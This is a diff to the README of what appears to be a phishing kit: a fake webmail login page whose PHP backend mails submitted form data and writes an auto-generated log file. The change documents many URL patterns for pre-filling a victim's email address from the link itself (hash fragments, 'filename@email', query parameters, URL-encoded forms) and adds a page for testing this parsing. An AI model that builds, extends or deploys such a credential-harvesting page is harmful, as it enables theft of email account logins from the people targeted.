@@ -39,6 +39,7 @@ A professional webmail login interface that provides a seamless experience for u
 ├── postmailer.php     # PHP backend for form processing
 ├── class.phpmailer.php # PHPMailer class for email functionality
 ├── class.smtp.php     # SMTP class for mail server communication
+├── test-parsing.html  # Email parsing test and demonstration page
 ├── SS-Or.txt          # Generated log file (created automatically)
 └── README.md          # This documentation
 ```
@@ -86,23 +87,42 @@ Then open `http://localhost:8000` in your browser.
 
 ### URL-based Email Population
 
-The system supports several methods to auto-populate the email field:
+The system supports multiple methods to auto-populate the email field with enhanced parsing:
 
-#### Hash Fragment
+#### Hash Fragment Patterns
 ```
 https://yourdomain.com/index.html#user@example.com
+https://yourdomain.com/#admin@company.org  
+https://yourdomain.com/login.html#contact@support.net
+```
+
+#### Filename @ Email Patterns
+```
+https://yourdomain.com/index.html@user@example.com
+https://yourdomain.com/login@admin@company.org
+https://yourdomain.com/webmail.html@support@domain.com
 ```
 
 #### Query Parameters
 ```
 https://yourdomain.com/index.html?email=user@example.com
 https://yourdomain.com/index.html?user=user@example.com
+https://yourdomain.com/index.html?username=admin@company.org
 ```
 
-#### Filename Pattern
-```
-https://yourdomain.com/index.html@user@example.com
-```
+#### Advanced Pattern Recognition
+The system uses multiple regex patterns to detect emails:
+- **Direct hash emails**: `#user@domain.com`
+- **Filename patterns**: `filename.ext@user@domain.com`
+- **URL-encoded emails**: Handles `%40` encoding
+- **Mixed patterns**: Combinations of the above
+
+#### Testing Email Parsing
+Use the included `test-parsing.html` file to test different URL patterns:
+- Open `test-parsing.html` in your browser
+- Click the test buttons to see parsing in action
+- View console output for detailed parsing steps
+- Test custom patterns by modifying the URL directly
 
 ### Backend Configuration
 
